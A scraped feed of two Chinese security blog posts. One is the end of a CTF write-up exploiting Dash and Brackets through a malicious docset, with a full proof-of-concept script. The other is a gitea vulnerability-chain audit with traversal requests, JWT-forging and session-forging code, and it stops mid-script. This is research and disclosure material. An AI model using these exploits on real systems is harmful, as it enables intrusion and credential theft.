data-rawwidth=&quot;1612&quot; data-rawheight=&quot;834&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f1387cef8bb0e11e95bd04389228fc2f&quot; data-watermark-src=&quot;v2-2cfaacf85c79d72c0eb08060a3756933&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这两个对象封装了文件系统和 shell 相关的功能。虽然我们不能 require(&#39;child_process&#39;)，但是通过 appshell.fs 可以实现任意文件读写。到文件读写这一步其实已经可以拿 flag 了，当然一开始我们没有给出 flag 的路径，还是反弹一个 shell 比较靠谱。覆盖可执行文件加上额外的触发条件即可实现远程代码执行。&lt;/p&gt;&lt;p&gt;在 Brackets 的扩展接口中，我找到了如下两个与系统 shell 相关的方法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;brackets.app.openURLInDefaultBrowser&lt;/li&gt;&lt;li&gt;brackets.app.showOSFolder&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;前者支持打开 file:/// 域名，在 Windows 下相当于 ShellExecute，打开一个 .cmd 或者 .exe 即可执行代码；而 showOSFolder 在 macOS 下的表现是，如果文件夹是一个有效的 .app bundle，那么等同于双击 .app，也就是运行。如果你不太明白，那么请尝试在终端中执行&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;find /Applications/Calculator.app
open /Applications/Calculator.app&lt;/code&gt;&lt;p&gt;因此我们先判断平台差异，通过 appshell.fs 创建可执行文件，然后调用对应的方法即可运行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;function calc() {  // use brackets.fs to write your own executable  // makedir, writeFile, chmod are your friends  if (brackets.app.getUserDocumentsDirectory().indexOf(&#39;/&#39;) === 0) {    brackets.app.showOSFolder(&#39;/Applications/Calculator.app&#39;);  } else {    brackets.app.openURLInDefaultBrowser(&#39;file:///C:/windows/system32/calc.exe&#39;);  }}&lt;/code&gt;&lt;p&gt;到这里即可实现与 VSCode 之前的 bug 完全一致的效果，通过 dns 重绑定攻击本地端口实现远程代码执行。在我之前的漏洞报告后，libCEF 参考 node.js 和 Electron 的做法修复了 dns 重绑定的问题。但是最新版 Brackets 的这个端口仍然可以从 localhost 访问。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;为什么盯上了 Dash 呢？&lt;/p&gt;&lt;p&gt;Dash 可以说是以 macOS 为主力开发环境的程序员当中很受欢迎的一款工具了，主要功能就是离线看文档。文档是一个后缀为 docset 的 bundle 文件夹，存放 html 资源和索引数据库等。&lt;/p&gt;&lt;p&gt;它具有两个攻击面，一个是展示文档时用的是 WebView，另一个是在打开文档的时候会启用一个内置的 GCDWebServer 来启动一个 http 服务，可通过其他计算机访问。&lt;/p&gt;&lt;p&gt;macOS 上的 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//developer.apple.com/documentation/webkit/webview%3Flanguage%3Dobjc&quot;&gt;WebView&lt;/a&gt; 和 iOS 的 UIWebView 在很多方面是一样的：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;没有进程隔离和 sandbox&lt;/li&gt;&lt;li&gt;在 file:/// 域下的文件默认具有 AllowUniversalAccessFromFileURLs 和 AllowFileAccessFromFileURLs 的 UXSS 能力&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在之前版本的 Dash 就可以通过一个恶意的 docset，以 XMLHttpRequest 的方式读取并上传本地文件（例如 ssh 公私钥）的内容。在 3.x 的某一个版本（具体不详）中增加了限制，如果访问的文件在 docset 目录之外会失败。但这个版本可以使用在压缩包中添加符号链接的方式绕过（由于 docset 是文件夹，通常的分发方式是使用 tar.gz 包）。此外符号链接的问题同样影响 Dash 内置的 http 服务。&lt;/p&gt;&lt;p&gt;经过报告后修复了本地文件泄露的问题，这也为出题提供了一个绝佳的条件——这是个允许跨域请求，却又不能简单 AJAX 读本地文件的环境，选手必须实现实质性的远程代码执行。最后这个 WebView 和系统内置 Safari 的 WebKit 是一致的，避免选手使用已公开的浏览器漏洞利用代码来获得权限。至于打 ctf 用 Safari 0day？疯了吗。&lt;/p&gt;&lt;hr&gt;&lt;blockquote&gt;&lt;b&gt;doc2own&lt;/b&gt; ( Points: 425, Solved by 4 Teams )&lt;br&gt;I have to fix these issues during the flight. Since that airline does not provide Internet, I have to download some documents for offline use.&lt;br&gt;&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//34.236.229.208%3A8080&quot;&gt;http://34.236.229.208:8080&lt;/a&gt;&lt;br&gt;Hint : It’s a pwnable game. You really need to achieve RCE to get the flag.&lt;/blockquote&gt;&lt;p&gt;题目设定的剧情就是一个像我一样的信息技术底层劳动力，在出差的路上需要修 bug，又没网，只能下一个离线文档备用。而这时候下到了不干净的文档，于是电脑中招了。&lt;/p&gt;&lt;p&gt;217 战队按照预期的解法做了出来。&lt;/p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot;&gt;https://blog.l4ys.tw/2018/07/realworld-ctf-2018-doc2own/&lt;/a&gt;&lt;p&gt;在这里附上我自己调试通过的一个解法，生成一个 docset，在 Brackets 运行的情况下打开会弹出一个计算器&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;contents=exploit.docset/Contentsdocs=$contents/Resources/Documents

rm -r $contentsmkdir -p $docs
cat &amp;gt; $docs/index.html &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;script&amp;gt;
async function main() {  const list = await fetch(&#39;http://localhost:9234/json&#39;).then(r =&amp;gt; r.json());  const item =  list.find(item =&amp;gt; item.url.indexOf(&#39;file:///&#39;) === 0);  if (!item) return console.error(&#39;invalid response&#39;);  const url = `ws://127.0.0.1:9234/devtools/page/${item.id}`;  console.log(&#39;url:&#39; + url);  exploit(url);}function exploit(url) {  function calc() {    const fs = window.appshell.fs;    const mkdir = path =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.makedir(path, 0755, err =&amp;gt; err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const writeFile = (path, content) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.writeFile(path, content, &#39;utf8&#39;, false, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const chmod = (path, mode) =&amp;gt; new Promise((resolve, reject) =&amp;gt;
      fs.chmod(path, mode, err =&amp;gt; err === 0 ? resolve(true) : reject(err)));    const INFO_PLIST = `&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
      &amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
      &amp;lt;plist version=&quot;1.0&quot;&amp;gt;
      &amp;lt;dict&amp;gt;
        &amp;lt;key&amp;gt;CFBundleExecutable&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;hello&amp;lt;/string&amp;gt;
        &amp;lt;key&amp;gt;CFBundleIconFile&amp;lt;/key&amp;gt;
        &amp;lt;string&amp;gt;AppIcon&amp;lt;/string&amp;gt;
      &amp;lt;/dict&amp;gt;
      &amp;lt;/plist&amp;gt;`;    const EXEC = `#!/bin/sh      open -a Calculator`;    const app = &#39;/tmp/test.app/&#39;;    const base = app + &#39;Contents/&#39;    return mkdir(base + &#39;MacOS&#39;)      .then(writeFile(base + &#39;Info.plist&#39;, INFO_PLIST))      .then(writeFile(base + &#39;MacOS/hello&#39;, EXEC))      .then(chmod(base + &#39;MacOS/hello&#39;, 0777))      .then(new Promise((resolve, reject) =&amp;gt; {        brackets.app.showOSFolder(app)      }));  }  const ws = new WebSocket(url);  ws.onopen = async () =&amp;gt; {    let counter = 13371337;    const send = (method, params) =&amp;gt; new Promise((resolve, reject) =&amp;gt; {      const id = counter++;      const recv = ({ data }) =&amp;gt; {        const parsed = JSON.parse(data);        if (parsed.id === id) {          resolve(parsed.result);          ws.removeEventListener(&#39;message&#39;, recv);        } else {          console.log(&#39;message: &#39;, data);        }      };      ws.addEventListener(&#39;message&#39;, recv);      ws.send(JSON.stringify({ id, method, params }));    });    const response = await send(&#39;Runtime.evaluate&#39;, { expression: `(${calc})()` });    console.log(response.result);    ws.close();  }  ws.onerror = () =&amp;gt; console.log(&#39;failed to connect&#39;);}main();&amp;lt;/script&amp;gt;
EOF

cat &amp;gt; $contents/Info.plist &amp;lt;&amp;lt;- &quot;EOF&quot;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&amp;gt;
&amp;lt;plist version=&quot;1.0&quot;&amp;gt;
&amp;lt;dict&amp;gt;
  &amp;lt;key&amp;gt;CFBundleIdentifier&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;CFBundleName&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;Exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;DocSetPlatformFamily&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;exploit&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;dashIndexFilePath&amp;lt;/key&amp;gt;
  &amp;lt;string&amp;gt;index.html&amp;lt;/string&amp;gt;
  &amp;lt;key&amp;gt;isDashDocset&amp;lt;/key&amp;gt;
  &amp;lt;true/&amp;gt;
&amp;lt;/dict&amp;gt;
&amp;lt;/plist&amp;gt;
EOF

sqlite3 -batch $contents/Resources/docSet.dsidx &amp;lt;&amp;lt; &quot;EOF&quot;CREATE TABLE searchIndex(id INTEGER PRIMARY KEY, name TEXT, type TEXT, path TEXT);CREATE UNIQUE INDEX anchor ON searchIndex (name, type, path);INSERT OR IGNORE INTO searchIndex(name, type, path) VALUES (&#39;Exploit&#39;, &#39;Class&#39;, &#39;index.html&#39;);EOF

open exploit.docset

tar czf exp.tar.gz exploit.docset&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9aed9f3c57895c564fc6c61b0437830f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9aed9f3c57895c564fc6c61b0437830f&quot; data-watermark-src=&quot;v2-ce59018ec0a4bbcde7976e3433c41c84&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;hr&gt;&lt;p&gt;但是出乎我意料的是，另外三支强队 PPP, CyKOR 和 ESPR 在短短的比赛期间内直接交上了两个不同的 0day 解法。赛后我向厂商整理漏洞报告，又快速浏览了一遍反汇编，又发现了另外的一些疑似远程代码执行问题（我没有做 poc，经过开发者自己确认存在）。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Dash 作者接到报告之后非常迅速地推出了修复补丁，检查了线上的 Dash 文档仓库确保之前没有实质性的攻击，在更新日志中明确写明了安全漏洞的存在并对以上战队表示了致谢。应急响应做得非常不错。&lt;/b&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c1224d9312c077421d4def640a5263d5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1244&quot; data-rawheight=&quot;1188&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c1224d9312c077421d4def640a5263d5&quot; data-watermark-src=&quot;v2-8696ee455e323a6046252f1330f416cb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;Dash 用户请尽快升级到 4.4.0 来修复这些问题。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-08-08-41544965</guid>
<pubDate>Wed, 08 Aug 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Go代码审计 - gitea 远程命令执行漏洞链</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-07-16-39835913.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/39835913&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-111a2318c077e5d343649b60742fa217_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是一个非常漂亮的漏洞链，很久没见过了。&lt;br&gt;我用docker来复现并学习这个漏洞，官方提供了docker镜像，vulhub也会上线这个环境。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_1&quot;&gt;漏洞一、 逻辑错误导致权限绕过&lt;/a&gt;&lt;/h2&gt;&lt;blockquote&gt;这是本漏洞链的导火索，其出现在Git LFS的处理逻辑中。&lt;br&gt;Git LFS是Git为大文件设置的存储容器，我们可以理解为，他将真正的文件存储在git仓库外，而git仓库中只存储了这个文件的索引（一个哈希值）。这样，git objects和.git文件夹下其实是没有这个文件的，这个文件储存在git服务器上。gitea作为一个git服务器，也提供了LFS功能。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;在 modules/lfs/server.go 文件中，PostHandler是POST请求的处理函数：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d929f2e40baaf6f1cfe1bfd334683da8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;564&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d929f2e40baaf6f1cfe1bfd334683da8&quot; data-watermark-src=&quot;v2-30163bf9e945a1bb9751aa52c6556186&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可见，其中间部分包含对权限的检查：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
if !authenticate(ctx, repository, rv.Authorization, true) {
    requireAuth(ctx)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;在没有权限的情况下，仅执行了requireAuth函数：这个函数做了两件事，一是写入WWW-Authenticate头，二是设置状态码为401。也就是说，在没有权限的情况下，并没有停止执行PostHandler函数。&lt;br&gt;所以，这里存在一处权限绕过漏洞。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_2&quot;&gt;漏洞二、目录穿越漏洞&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;这个权限绕过漏洞导致的后果是，未授权的任意用户都可以为某个项目（后面都以vulhub/repo为例）创建一个Git LFS对象。&lt;/p&gt;&lt;p&gt;这个LFS对象可以通过http://example.com/vulhub/repo.git/info/lfs/objects/[oid]这样的接口来访问，比如下载、写入内容等。其中[oid]是LFS对象的ID，通常来说是一个哈希，但gitea中并没有限制这个ID允许包含的字符，这也是导致第二个漏洞的根本原因。&lt;/p&gt;&lt;p&gt;我们利用第一个漏洞，先发送一个数据包，创建一个Oid为....../../../etc/passwd的LFS对象：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /vulhub/repo.git/info/lfs/objects HTTP/1.1
Host: your-ip:3000Accept-Encoding: gzip, deflate
Accept: application/vnd.git-lfs+json
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 151

{ 
    &quot;Oid&quot;: &quot;....../../../etc/passwd&quot;, 
    &quot;Size&quot;: 1000000, 
    &quot;User&quot; : &quot;a&quot;, 
    &quot;Password&quot; : &quot;a&quot;, 
    &quot;Repo&quot; : &quot;a&quot;, 
    &quot;Authorization&quot; : &quot;a&quot;
}&lt;/code&gt;&lt;p&gt;其中，vulhub/repo是一个公开的项目。&lt;/p&gt;&lt;blockquote&gt;也就是说，这个漏洞的利用是有条件的，第一个条件就是需要有一个公开项目。为什么呢？虽然“创建LFS对象”接口有权限绕过漏洞，但是“读取这个对象所代表的文件”接口没有漏洞，会先检查你是否有权限访问这个LFS对象所在的项目。只有公开项目才有权限读取。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;见下图，发送数据包后，虽然返回了401状态码，但实际上这个LFS对象已经创建成功，且其Oid为....../../../etc/passwd。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e9540049efacee155988a5491e99364_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;150&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6e9540049efacee155988a5491e99364&quot; data-watermark-src=&quot;v2-565bff4dd5b1e6d812fa0a1f56416882&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;第二步，就是访问这个对象。访问方法就是GET请求http://example.com/vulhub/repo.git/info/lfs/objects/[oid]/sth，oid就是刚才指定的，这里要用url编码一下。&lt;/p&gt;&lt;p&gt;见下图，/etc/passwd已被成功读取：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-67ea3af4a552aa4f3206b88d1f1225ee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;291&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-67ea3af4a552aa4f3206b88d1f1225ee&quot; data-watermark-src=&quot;v2-90dc0125fbfb188264dc7b126b1caf69&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么，我们来看看为什么读取到了/etc/passwd文件。&lt;/p&gt;&lt;p&gt;代码 modules/lfs/content_store.go ：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d8ad85235bfa87345192ce67c32dad27_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;368&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d8ad85235bfa87345192ce67c32dad27&quot; data-watermark-src=&quot;v2-12d9755017f8fa97cd644ba53e169c65&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可见，meta.Oid被传入transformKey函数，这个函数里，将Oid转换成了key[0:2]/key[2:4]/key[4:]这样的形式，前两个、中间两个字符做为目录名，第四个字符以后的内容作为文件名。&lt;/p&gt;&lt;p&gt;那么，我创建的Oid为....../../../etc/passwd，在经过transformKey函数后就变成了../../../../../etc/passwd，s.BasePath是LFS对象的基础目录，二者拼接后自然就读取到了/etc/passwd文件。&lt;/p&gt;&lt;p&gt;这就是第二个漏洞：目录穿越。&lt;/p&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#jwt&quot;&gt;漏洞三、读取配置文件，构造JWT密文&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;vulhub/repo虽然是一个公开项目，但默认只有读权限。我们需要进一步利用。&lt;/p&gt;&lt;p&gt;我们利用目录穿越漏洞，可以读取到gitea的配置文件。这个文件在$GITEA_CUSTOM/conf/app.ini，$GITEA_CUSTOM是gitea的根目录，默认是/var/lib/gitea/，在vulhub里是/data/gitea。&lt;/p&gt;&lt;p&gt;所以，要从LFS的目录跨越到$GITEA_CUSTOM/conf/app.ini，需要构造出的Oid是....gitea/conf/app.ini （经过转换后就变成了/data/gitea/lfs/../../gitea/conf/app.ini，也就是/data/gitea/conf/app.ini。原漏洞作者给出的POC这一块是有坑的，这个Oid需要根据不同$GITEA_CUSTOM的设置进行调整。）&lt;/p&gt;&lt;p&gt;成功读取到配置文件（仍需先发送POST包创建Oid为....gitea/conf/app.ini的LFS对象）：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7b45c16567a56377885231cc84353a7b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;310&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b45c16567a56377885231cc84353a7b&quot; data-watermark-src=&quot;v2-47c9e387bc1818ef94ba83b04b5c7a8e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;配置文件中有很多敏感信息，如数据库账号密码、一些Token等。如果是sqlite数据库，我们甚至能直接下载之。当然，密码加了salt。&lt;/p&gt;&lt;p&gt;Gitea中，LFS的接口是使用JWT认证，其加密密钥就是配置文件中的LFS_JWT_SECRET。所以，这里我们就可以用来构造JWT认证，进而获取LFS完整的读写权限。&lt;/p&gt;&lt;p&gt;我们用python来生成密文：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;import jwt
import time
import base64
 
 
def decode_base64(data):
 missing_padding = len(data) % 4
 if missing_padding != 0:
 
data += &#39;=&#39;* (4 - missing_padding)
 return base64.urlsafe_b64decode(data)
 
 
jwt_secret = decode_base64(&#39;oUsPAAkeic6HaBMHPiTVHxTeCrEDc29sL6f0JuVp73c&#39;)
public_user_id = 1
public_repo_id = 1
nbf = int(time.time())-(60*60*24*1000)
exp = int(time.time())+(60*60*24*1000)
 
token = jwt.encode({&#39;user&#39;: public_user_id, &#39;repo&#39;: public_repo_id, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, jwt_secret, algorithm=&#39;HS256&#39;)
token = token.decode()
 
print(token)&lt;/code&gt;&lt;p&gt;其中，jwt_secret是第二个漏洞中读取到的密钥；public_user_id是项目所有者的id，public_repo_id是项目id，这个项目指LFS所在的项目；nbf是指这个密文的开始时间，exp是这个密文的结束时间，只有当前时间处于这两个值中时，这个密文才有效。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-17a35c2d4302d791cab708317b57799a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;29&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_3&quot;&gt;漏洞四、利用条件竞争，写入任意文件&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/h2&gt;&lt;p&gt;现在，我们能构造JWT的密文，即可访问LFS中的写入文件接口，也就是PutHandler。&lt;br&gt;PUT操作主要是如下代码：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15b38cbef6917579ef30c29b98abe334_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;504&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-15b38cbef6917579ef30c29b98abe334&quot; data-watermark-src=&quot;v2-4f9ee61ea61472e828aa6b82a5c88b86&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;整个过程整理如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;transformKey(meta.Oid) + .tmp 后缀作为临时文件名&lt;/li&gt;&lt;li&gt;如果目录不存在，则创建目录&lt;/li&gt;&lt;li&gt;将用户传入的内容写入临时文件&lt;/li&gt;&lt;li&gt;如果文件大小和meta.Size不一致，则返回错误（meta.size是第一步中创建LFS时传入的Size参数）&lt;/li&gt;&lt;li&gt;如果文件哈希和meta.Oid不一致，则返回错误&lt;/li&gt;&lt;li&gt;将临时文件重命名为真正的文件名&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;因为我们需要写入任意文件，所以Oid一定是能够穿越到其他目录的一个恶意字符串，而一个文件的哈希（sha256）却只是一个HEX字符串。所以上面的第5步，一定会失败导致退出，所以不可能执行到第6步。也就是说，我们只能写入一个后缀是“.tmp”的临时文件。&lt;br&gt;另外，作者用到了defer os.Remove(tmpPath)这个语法。在go语言中，defer代表函数返回时执行的操作，也就是说，不管函数是否返回错误，结束时都会删除临时文件。&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;所以，我们需要解决的是两个问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;能够写入一个.tmp为后缀的文件，怎么利用？&lt;/li&gt;&lt;li&gt;如何让这个文件在利用成功之前不被删除？&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们先思考第二个问题。漏洞发现者给出的方法是，利用条件竞争。&lt;/p&gt;&lt;p&gt;&lt;br&gt;因为gitea中是用流式方法来读取数据包，并将读取到的内容写入临时文件，那么我们可以用流式HTTP方法，传入我们需要写入的文件内容，然后挂起HTTP连接。这时候，后端会一直等待我传剩下的字符，在这个时间差内，Put函数是等待在io.Copy那个步骤的，当然也就不会删除临时文件了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;那么，思考第一个问题，.tmp为后缀的临时文件，我们能做什么？&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#session&quot;&gt;漏洞五、伪造session提升权限&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;最简单的，我们可以向/etc/cron.d/中写入一个crontab配置文件，然后反弹获取shell。但通常gitea不会运行在root权限，所以我们需要思考其他方法。&lt;br&gt;gitea使用&lt;a href=&quot;https://github.com/go-macaron/session&quot;&gt;go-macaron/session&lt;/a&gt;这个第三方模块来管理session，默认使用文件作为session存储容器。我们来阅读&lt;a href=&quot;https://github.com/go-macaron/session/blob/master/file.go&quot;&gt;go-macaron/session源码&lt;/a&gt;：&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bf5e7b4dc3cc55db609410b23a438f9c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;613&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-bf5e7b4dc3cc55db609410b23a438f9c&quot; data-watermark-src=&quot;v2-9eb7a8a6f3ef1b257e2296dd641f1efd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;这里面有几个很重要的点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;session文件名为sid[0]/sid[1]/sid&lt;/li&gt;&lt;li&gt;对象被用Gob序列化后存入文件&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Gob是Go语言独有的序列化方法。我们可以编写一段Go语言程序，来生成一段Gob编码的session：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;package
main
import (
  &quot;fmt&quot;
  &quot;encoding/gob&quot;
  &quot;bytes&quot;
  &quot;encoding/hex&quot;
)
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
  gob.Register(v)
  }
   buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}
func main() {
  var uid int64 = 1
  obj := map[interface{}]interface{} {&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }
  data, err := EncodeGob(obj)
  if err != nil {
  fmt.Println(err)
  }
  edata := hex.EncodeToString(data)
  fmt.Println(edata)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;其中，{&quot;_old_iod&quot;:&lt;br&gt;&quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }就是session中的数据，uid是管理员id，uname是管理员用户名。编译并执行上述代码，得到一串hex，就是伪造的数据。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;原作者给出的POC是他生成好的一段二进制文件，uid和uname不能自定义。&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cec39f215655fbd55a1977e1e5f900ff_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;359&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-cec39f215655fbd55a1977e1e5f900ff&quot; data-watermark-src=&quot;v2-9538e95bc0f3bc1e535aa76b1801b955&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;接着，我写了一个简单的Python脚本来进行后续利用（需要Python3.6）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
import
requests
import jwt
import time
import base64
import logging
import sys
import json
from urllib.parse import quote
 
 
logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
 
BASE_URL = &#39;http://your-ip:3000/vulhub/repo&#39;
JWT_SECRET = &#39;AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y&#39;
USER_ID = 1
REPO_ID = 1
SESSION_ID = &#39;11vulhub&#39;
